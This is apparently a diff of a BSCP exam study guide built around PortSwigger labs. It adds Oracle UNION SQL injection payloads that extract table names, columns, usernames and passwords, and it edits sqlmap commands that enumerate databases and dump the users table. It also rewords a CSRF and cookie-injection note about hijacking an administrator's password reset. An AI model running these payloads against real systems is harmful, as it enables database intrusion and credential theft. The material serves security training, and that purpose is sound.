@@ -918,7 +918,7 @@ Referrer-Policy: unsafe-url
 <img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
 ```  
 
->During BSCP **Exam** set the email change value to that of the exploit server ***hacker@exploit-server.net*** email address. Then abose the password reset for the administrator.  
+>During BSCP **Exam** set the email change value to that of the exploit server ***hacker@exploit-server.net*** email address. Then you can change the administrator password witht the reset function.  
 
 ![csrf-set-cookie-poc.png](images/csrf-set-cookie-poc.png)  
 
@@ -1021,6 +1021,30 @@ sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "Tracki
 
 [PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
 
+### Oracle  
+
+>Identified SQL injection by using add single quote to the end of the **category** parameter value and observing response of internal server error.  
+  
+>Retrieve the list of tables in the Oracle database:  
+
+```
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+```  
+
+>Oracle payload to retrieve the details of the columns in the table.  
+
+```
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--
+```  
+
+>Oracle payload to retrieve the usernames and passwords from Users_XXX table.  
+
+```
+'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--
+```  
+  
+[PortSwigger Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)  
+
 ### SQLMAP 
 
 >Sample SQLMAP commands to determine what SQL injection vulnerability exist and retrieving different types of information from backend database.  
@@ -1030,25 +1054,25 @@ sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "Tracki
 >SQLMAP determine the vulnerability, and perform initial enumeration.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3
+sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3
 ```  
 
 >SQLMAP determine the database DBMS.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
+sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3 --dbms=PostgreSQL -dbs
 ```  
 
 >SQLMAP determine Database, Tables, dump, data Exfiltration.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
+sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --level=5 --risk=3 --dbms=PostgreSQL -D public --tables
 ```  
 
 >Dump content from table **users** in the **public** database.  
 
 ```
-sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
+sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
 
 ```  
 
@@ -1058,7 +1082,7 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 >Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data exfil process.  
 
 ```bash
-sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
+sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```  
 
 ### SQLi Manual Exploit  
